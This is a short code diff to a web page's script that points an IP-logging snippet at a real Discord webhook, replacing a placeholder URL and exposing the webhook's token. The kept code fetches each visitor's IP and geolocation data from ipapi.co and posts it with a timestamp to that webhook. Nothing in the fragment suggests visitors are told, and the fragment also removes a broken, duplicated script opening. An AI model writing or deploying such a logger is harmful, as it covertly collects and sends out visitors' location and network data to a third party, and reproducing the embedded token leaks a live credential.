@@ -267,11 +267,6 @@ function send() {
 </html>
 
 <script>
-fetch("https://api.ipify.org?format=json")
-  .then(res => res.json())
-  .then(data => {
-
-<script>
 fetch("https://ipapi.co/json/")
   .then(res => res.json())
   .then(data => {
@@ -286,7 +281,7 @@ fetch("https://ipapi.co/json/")
       time: new Date().toLocaleString()
     };
 
-    fetch("YOUR_WEBHOOK_URL_HERE", {
+    fetch("https://discord.com/api/webhooks/1485257630971723857/BsUSqz-UuiiuQqxrAJERN-AjbKVnmiOEg_g59dorUV9UndpskJDtrL1a0cVaFR_NnXPN", {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
